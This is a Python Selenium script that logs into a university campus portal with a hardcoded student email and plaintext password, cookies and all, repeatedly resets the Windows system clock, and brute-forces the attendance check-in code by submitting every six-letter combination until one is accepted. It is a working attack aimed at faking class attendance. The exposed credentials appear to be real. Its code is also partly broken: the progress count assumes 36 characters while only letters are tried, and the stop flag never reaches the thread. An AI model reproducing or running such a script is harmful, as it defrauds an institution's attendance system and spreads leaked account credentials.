from selenium import webdriver
import time
import pickle
from selenium.webdriver.common.by import By
from selenium.webdriver.support.wait import WebDriverWait
import selenium.webdriver.support.expected_conditions as EC
import os
import string
import win32api
import sys
import datetime
import threading

timeX = [ 2023, # Year
                  9, # Month
                  11, # Day
                  15, # Hour
                  1, # Minute
                  0, # Second
                  0, # Millisecond
              ]

stop = False

def timeControl():
    print("Started")
    while not stop:
        dayOfWeek = datetime.datetime(timeX[0], timeX[1], timeX[2], timeX[3], timeX[4], timeX[5]).isocalendar()[2]
        win32api.SetSystemTime(timeX[0], timeX[1], dayOfWeek, timeX[2], timeX[3], timeX[4], timeX[5], timeX[6])
        time.sleep(600)
        print("Progress: {}%".format(progress))

def init(username, password, browser):
    browser.get("https://i.napier.ac.uk/campusm/home#menu")

    # return cookies to not log in again
    if os.path.exists("cookies.pkl"):
        cookies = pickle.load(open("cookies.pkl", "rb"))
        for cookie in cookies:
            browser.add_cookie(cookie)

    time.sleep(3)
    cookies = False
    # if not logged in
    if not browser.current_url.startswith("https://i.napier.ac.uk/"):
        try:
            WebDriverWait(browser, 1000).until(EC.presence_of_element_located((By.XPATH, "//input[@type='email']")))
            browser.find_element(By.XPATH, "//input[@type='email']").send_keys(username)
            browser.find_element(By.XPATH, "//input[@type='submit']").click()
            time.sleep(2)

            WebDriverWait(browser, 1000).until(EC.presence_of_element_located((By.XPATH, "//input[@type='password']")))
            browser.find_element(By.XPATH, "//input[@type='password']").send_keys(password)
            browser.find_element(By.XPATH, "//input[@type='submit']").click()
            time.sleep(4)

            WebDriverWait(browser, 1000).until_not(EC.presence_of_element_located((By.CLASS_NAME, "displaySign")))

            WebDriverWait(browser, 1000).until(EC.presence_of_element_located((By.XPATH, "//input[@type='submit']"))).click()
            cookies = True
            time.sleep(2)
        except:
            return False

    WebDriverWait(browser, 20).until(EC.presence_of_element_located((By.ID, "menu-option-31782")))
    time.sleep(3)
    browser.find_element(By.ID, "menu-option-31782").click()

    time.sleep(2)
    if cookies:
        pickle.dump(browser.get_cookies(), open("cookies.pkl", "wb"))

    #print(elem.get_attribute("interHTML"))
    browser.switch_to.frame(1)
    # print(browser.page_source)

    try:
        browser.find_element(By.XPATH, "//button[text()='Check in']").click()
    except:
        return False
    return True

def checkIn(browser):
    global progress
    progress = 0
    input = browser.find_element(By.XPATH, "//input[@type='text']")
    submit = browser.find_element(By.XPATH, "//button[@type='submit']")
    for f1 in list(string.ascii_uppercase):
        for f2 in list(string.ascii_uppercase):
            for f3 in list(string.ascii_uppercase):
                for f4 in list(string.ascii_uppercase):
                    for f5 in list(string.ascii_uppercase):
                        for f6 in list(string.ascii_uppercase):
                            code = f1+f2+f3+f4+f5+f6
                            input.send_keys(code)
                            if submit.is_enabled():
                                print("Finished with code:", code)
                                return True
                            progress += 100 / 2821109907456 # 36^6
                            input.clear()
    return False

def main():
    username = "40618869@live.napier.ac.uk"
    password = "QAZxswEDCvfr_8907"

    timeThread = threading.Thread(target=timeControl)
    timeThread.start()

    browser = webdriver.Chrome()

    if not init(username, password, browser):
        stop = True
        browser.close()
        print("No check in available or failed to login")
        return

    if not checkIn(browser):
        print("None of check in code works")

    stop = True

if __name__ == "__main__":
    main()